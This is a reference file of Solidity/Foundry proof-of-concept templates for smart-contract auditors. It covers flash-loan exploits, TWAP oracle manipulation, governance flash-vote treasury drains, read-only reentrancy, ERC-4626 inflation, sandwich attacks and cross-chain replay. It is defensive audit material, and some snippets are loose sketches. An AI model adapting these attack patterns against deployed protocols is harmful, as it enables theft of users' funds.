# Advanced EVM PoC Patterns

> **Purpose:** Advanced exploit demonstration patterns for EVM auditors. Complements `foundry_poc.md` and `Hardhat_poc.md` in the framework root.
> **Integration:** Referenced by `audit-workflow1.md` Step 6.1 and `CommandInstruction.md` AUDITOR'S MINDSET.

---

## Mainnet Fork Execution Guide (GAP-001)

### Block Pinning for Reproducibility

```solidity
// foundry.toml
[profile.default]
eth_rpc_url = "https://eth-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}"
fork_block_number = 19500000  // Pin for reproducibility

// In test file
function setUp() public {
    // Alternative: dynamic fork
    uint256 mainnetFork = vm.createFork(vm.envString("MAINNET_RPC_URL"), 19500000);
    vm.selectFork(mainnetFork);
}
```

### State Simulation for Complex DeFi

```solidity
// When you need to interact with live protocol state
function testMainnetStateExploit() public {
    // Fork at specific block
    vm.createSelectFork("mainnet", 19500000);
    
    // Get real protocol instance
    IVault vault = IVault(VAULT_ADDRESS);
    
    // Check current state
    uint256 tvl = vault.totalAssets();
    console.log("TVL:", tvl);
    
    // Impersonate and execute
    vm.startPrank(WHALE);
    IERC20(WETH).approve(address(vault), type(uint256).max);
    vault.deposit(depositAmount, WHALE);
    vm.stopPrank();
}
```

### Handling Protocol Constraints

```solidity
// Governance timelock bypass for testing
function testBypassTimelock() public {
    // Warp past timelock
    vm.warp(block.timestamp + 2 days + 1);
    
    // Now execute the queued proposal
    governance.execute(proposalId);
}

// Oracle freshness for price-dependent exploits
function testOracleFreshness() public {
    // Mock oracle update
    vm.mockCall(
        address(oracle),
        abi.encodeWithSelector(IOracle.latestRoundData.selector),
        abi.encode(roundId, targetPrice, startedAt, block.timestamp, answeredInRound)
    );
}
```

---

## Multi-Transaction State Manipulation (GAP-002)

### Two-Step Exploits

```solidity
contract MultiTxExploit is Test {
    // TX1: Setup malicious state
    function testSetupPhase() public {
        // Create malicious vault with controlled oracle
        MaliciousVault malicious = new MaliciousVault();
        
        // Deposit to establish position
        vm.prank(attacker);
        protocol.createPosition(address(malicious));
        
        // Snapshot state for TX2
        uint256 snapshot = vm.snapshot();
    }
    
    // TX2: Exploit after state change
    function testExploitPhase() public {
        // Roll forward blocks for oracle manipulation
        vm.roll(block.number + TWAP_WINDOW);
        
        // Execute exploit with manipulated state
        vm.prank(attacker);
        protocol.liquidate(victimPosition);
    }
    
    // Combined test showing full attack
    function testFullAttack() public {
        // Step 1: Setup
        vm.prank(attacker);
        uint256 positionId = protocol.createPosition(1000e18);
        
        // Step 2: Wait (block advancement)
        vm.roll(block.number + 100);
        vm.warp(block.timestamp + 1200); // 20 minutes
        
        // Step 3: Manipulate
        oracle.updatePrice(manipulatedPrice);
        
        // Step 4: Execute
        vm.prank(attacker);
        protocol.executeExploit(positionId);
    }
}
```

### Multi-Block Oracle Manipulation (Mango-Style)

```solidity
function testTWAPManipulation() public {
    // Block N: Large swap to move spot price
    vm.prank(attacker);
    dex.swap(LARGE_AMOUNT, token0, token1);
    
    // Blocks N+1 to N+TWAP_WINDOW: Maintain manipulated price
    for (uint256 i = 0; i < TWAP_WINDOW; i++) {
        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 12);
        // Keep price elevated with smaller trades
    }
    
    // Block N+TWAP_WINDOW+1: TWAP is now manipulated
    uint256 manipulatedTWAP = oracle.getTWAP();
    
    // Execute attack using manipulated TWAP
    vm.prank(attacker);
    lending.borrow(MAX_BORROW, manipulatedTWAP);
}
```

---

## Flash Loan Provider Abstraction (GAP-003)

### Provider Selection Matrix

| Provider | Max Liquidity | Fee | Callback Interface |
|----------|--------------|-----|-------------------|
| Aave V3 | ~$2B USDC | 0.09% | `executeOperation(assets[], amounts[], premiums[], initiator, params)` |
| Uniswap V3 | Pool-specific | 0% | `uniswapV3FlashCallback(fee0, fee1, data)` |
| Balancer V2 | ~$500M | 0% | `receiveFlashLoan(tokens[], amounts[], feeAmounts[], userData)` |
| dYdX | ~$100M | 0% | Must use `SoloMargin.operate()` |
| Maker | ~$500M DAI | 0% | `onFlashLoan(initiator, token, amount, fee, data)` |

### Unified Flash Loan Interface

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {IFlashLoanRecipient} from "./interfaces/IFlashLoanRecipient.sol";

abstract contract FlashLoanReceiver {
    enum Provider { AAVE_V3, UNISWAP_V3, BALANCER_V2, MAKER }
    
    function executeFlashLoan(
        Provider provider,
        address[] memory assets,
        uint256[] memory amounts,
        bytes memory params
    ) internal {
        if (provider == Provider.AAVE_V3) {
            _executeAaveFlashLoan(assets, amounts, params);
        } else if (provider == Provider.BALANCER_V2) {
            _executeBalancerFlashLoan(assets, amounts, params);
        } else if (provider == Provider.UNISWAP_V3) {
            _executeUniswapFlashLoan(assets[0], amounts[0], params);
        }
    }
    
    function _executeAaveFlashLoan(
        address[] memory assets,
        uint256[] memory amounts,
        bytes memory params
    ) internal {
        uint256[] memory modes = new uint256[](assets.length); // 0 = no debt
        AAVE_POOL.flashLoan(
            address(this),
            assets,
            amounts,
            modes,
            address(this),
            params,
            0  // referralCode
        );
    }
    
    // Override in exploit contract
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        require(msg.sender == address(AAVE_POOL), "!pool");
        require(initiator == address(this), "!initiator");
        
        _executeExploit(assets, amounts, params);
        
        // Repay
        for (uint256 i = 0; i < assets.length; i++) {
            IERC20(assets[i]).approve(address(AAVE_POOL), amounts[i] + premiums[i]);
        }
        return true;
    }
    
    function _executeExploit(
        address[] calldata assets,
        uint256[] calldata amounts,
        bytes calldata params
    ) internal virtual;
}
```

### Flash Loan PoC Template

```solidity
contract FlashLoanExploit is Test, FlashLoanReceiver {
    function testFlashLoanAttack() public {
        address[] memory assets = new address[](1);
        assets[0] = WETH;
        
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 10_000 ether;
        
        executeFlashLoan(Provider.AAVE_V3, assets, amounts, "");
        
        // Assert profit
        assertGt(IERC20(WETH).balanceOf(attacker), 0);
    }
    
    function _executeExploit(
        address[] calldata assets,
        uint256[] calldata amounts,
        bytes calldata
    ) internal override {
        // Step 1: Use flash-loaned funds
        IERC20(assets[0]).approve(address(target), amounts[0]);
        
        // Step 2: Execute attack
        target.vulnerableFunction(amounts[0]);
        
        // Profit is kept, repay happens in executeOperation
    }
}
```

---

## Account Abstraction Attack Patterns (GAP-004)

### ERC-4337 EntryPoint Exploitation

```solidity
// Testing UserOperation validation bypass
function testUserOpValidation() public {
    UserOperation memory userOp = UserOperation({
        sender: address(smartWallet),
        nonce: 0,
        initCode: "",
        callData: abi.encodeCall(IAccount.execute, (target, value, data)),
        callGasLimit: 100000,
        verificationGasLimit: 100000,
        preVerificationGas: 21000,
        maxFeePerGas: 1 gwei,
        maxPriorityFeePerGas: 1 gwei,
        paymasterAndData: "",
        signature: maliciousSignature
    });
    
    UserOperation[] memory ops = new UserOperation[](1);
    ops[0] = userOp;
    
    // Execute with bundler
    entryPoint.handleOps(ops, payable(bundler));
}
```

### EIP-7702 Delegation Phishing

```solidity
// Detecting delegation target change attacks
function testDelegationOverwrite() public {
    // Initial delegation to legitimate contract
    bytes memory auth = _createAuthorization(
        legitimateTarget,
        nonce,
        deadline,
        privateKey
    );
    
    // Attacker tricks user into new delegation
    bytes memory maliciousAuth = _createAuthorization(
        maliciousTarget,  // Attacker's contract
        nonce + 1,
        deadline,
        compromisedKey  // Via phishing
    );
    
    // Storage collision: new delegate reads old storage
    assertEq(
        vm.load(address(wallet), slot),
        expectedValue  // Attacker can read sensitive data
    );
}
```

---

## L2 Sequencer Attack Patterns (GAP-005)

### Sequencer Downtime Oracle Check

```solidity
function testSequencerDowntimeExploit() public {
    // Sequencer reports as up, but we're testing downtime scenario
    vm.mockCall(
        SEQUENCER_UPTIME_FEED,
        abi.encodeWithSelector(AggregatorV3Interface.latestRoundData.selector),
        abi.encode(
            1,          // roundId
            0,          // answer: 0 = up, 1 = down
            block.timestamp - 3601,  // startedAt (down for > 1 hour)
            block.timestamp,
            1
        )
    );
    
    // Protocol should revert if sequencer was down
    vm.expectRevert("Sequencer down");
    oracle.getPrice(token);
}
```

### L1→L2 Message Replay

```solidity
function testL1L2MessageReplay() public {
    // On L2: Process same L1 message twice
    bytes memory message = abi.encode(deposit, amount, recipient);
    bytes32 messageHash = keccak256(message);
    
    // First execution (legitimate)
    l2Bridge.finalizeDeposit(message, proof1);
    assertTrue(l2Bridge.processedMessages(messageHash));
    
    // Second execution attempt (replay)
    vm.expectRevert("Already processed");
    l2Bridge.finalizeDeposit(message, proof2);
}
```

---

## Governance Attack Patterns (GAP-008)

### Flash Vote Attack

```solidity
function testFlashVote() public {
    // Step 1: Flash loan governance tokens
    uint256 loanAmount = governance.quorum() + 1;
    flashLoan(GOV_TOKEN, loanAmount);
    
    // Step 2: Delegate to self (some protocols allow instant)
    IERC20Votes(GOV_TOKEN).delegate(attacker);
    
    // Step 3: Create and vote on malicious proposal
    uint256 proposalId = governance.propose(
        targets,
        values,
        calldatas,
        "Drain treasury"
    );
    
    // Step 4: Vote with flash-loaned tokens
    governance.castVote(proposalId, 1); // Vote FOR
    
    // Step 5: Repay flash loan
    // Votes are already cast with borrowed tokens
}
```

### Proposal Hijacking

```solidity
function testProposalHijacking() public {
    // Vulnerable: execute() uses msg.sender for auth
    // instead of proposal.proposer
    
    // Step 1: Wait for legitimate proposal to pass
    vm.warp(block.timestamp + votingPeriod + 1);
    governance.queue(proposalId);
    
    vm.warp(block.timestamp + timelockDelay);
    
    // Step 2: Frontrun the execute call
    vm.prank(attacker);
    governance.execute(proposalId); // Attacker executes, gets rewards
}
```

---

## Read-Only Reentrancy Patterns (GAP-012)

### Curve-Style Read-Only Reentrancy

```solidity
contract ReadOnlyReentrancyTest is Test {
    function testCurveReadOnlyReentrancy() public {
        // Step 1: Call vulnerable function that makes external call
        // During callback, read manipulated state
        
        attacker.attack();
    }
}

contract Attacker {
    IVulnerableProtocol vulnerable;
    ICurvePool curvePool;
    
    function attack() external {
        // Trigger curve pool's remove_liquidity
        // This makes callback during state update
        curvePool.remove_liquidity(lpAmount);
    }
    
    // Callback during Curve operation
    receive() external payable {
        // Curve pool state is inconsistent here
        // virtual_price is artificially low
        uint256 manipulatedPrice = curvePool.get_virtual_price();
        
        // Exploit protocol that reads this price
        vulnerable.borrow(collateral, manipulatedPrice);
    }
}
```

### ERC-4626 Inflation Attack

```solidity
function testVaultInflationAttack() public {
    // Step 1: First depositor with minimal amount
    vm.prank(attacker);
    vault.deposit(1, attacker);
    
    // Step 2: Donate to vault to inflate share price
    IERC20(asset).transfer(address(vault), 1000e18);
    
    // Step 3: Victim deposits, gets 0 shares due to rounding
    vm.prank(victim);
    uint256 shares = vault.deposit(999e18, victim);
    assertEq(shares, 0); // Victim gets nothing!
    
    // Step 4: Attacker withdraws everything
    vm.prank(attacker);
    vault.redeem(vault.balanceOf(attacker), attacker, attacker);
}
```

---

## MEV-Aware Exploit Patterns (GAP-007)

### Sandwich Attack Demonstration

```solidity
function testSandwichResistance() public {
    // Setup: Large pending swap
    bytes memory victimTx = abi.encodeCall(
        router.swap,
        (tokenIn, tokenOut, amountIn, minAmountOut, deadline)
    );
    
    // Frontrun: Buy tokens to raise price
    vm.prank(mevBot);
    router.swap(tokenOut, tokenIn, frontrunAmount, 0, deadline);
    
    // Victim transaction executes at worse price
    vm.prank(victim);
    (bool success,) = address(router).call(victimTx);
    assertTrue(success); // But with slippage loss
    
    // Backrun: Sell at profit
    vm.prank(mevBot);
    router.swap(tokenIn, tokenOut, frontrunAmount, 0, deadline);
    
    // Assert MEV profit
    assertGt(
        IERC20(tokenOut).balanceOf(mevBot),
        initialMevBalance
    );
}
```

### Atomic Backrun Pattern

```solidity
function testAtomicBackrun() public {
    // Bundle execution: state change + exploit in same block
    vm.prank(attacker);
    bytes[] memory calls = new bytes[](2);
    
    // Call 1: Trigger state change
    calls[0] = abi.encodeCall(target.triggerStateChange, ());
    
    // Call 2: Exploit the state change in same tx
    calls[1] = abi.encodeCall(target.exploitNewState, ());
    
    multicall.aggregate(calls);
}
```

---

## Cross-Chain Replay Patterns (GAP-010)

### Chain ID Missing from Signature

```solidity
function testMissingChainId() public {
    // Sign message on Ethereum
    bytes memory ethMessage = abi.encode(
        action,
        amount,
        nonce
        // Note: No chainId!
    );
    bytes memory signature = sign(ethMessage, privateKey);
    
    // Replay on Polygon
    vm.chainId(137); // Switch to Polygon
    
    // Same signature is valid!
    assertTrue(
        polygonContract.execute(action, amount, nonce, signature)
    );
}
```

### Bridge Replay Attack

```solidity
function testBridgeReplay() public {
    // Message from L1 processed on L2
    bytes memory bridgeMessage = abi.encode(
        deposit,
        user,
        amount,
        nonce  // Vulnerable: nonce not chain-specific
    );
    
    // Process on L2-A
    l2BridgeA.finalizeDeposit(bridgeMessage, proof);
    
    // Same message valid on L2-B (different chain deployment)
    vm.chainId(CHAIN_ID_L2_B);
    l2BridgeB.finalizeDeposit(bridgeMessage, proof);
    
    // User receives double the amount!
}
```

---

## Integration with InfoSec-Framework

This document addresses RED_TEAM_REVIEW gaps GAP-001 through GAP-013. It should be read alongside:
- `foundry_poc.md` — Basic PoC templates (root level)
- `Hardhat_poc.md` — Hardhat equivalents
- `audit-workflow1.md` — Step 6.1 (PoC development phase)
- `pashov-skills/attack-vectors/` — 170 vector detection patterns

### Usage

1. Identify attack category from hypothesis
2. Find matching pattern section above
3. Adapt template to specific vulnerability
4. Run with `forge test --match-test testExploit -vvvv`
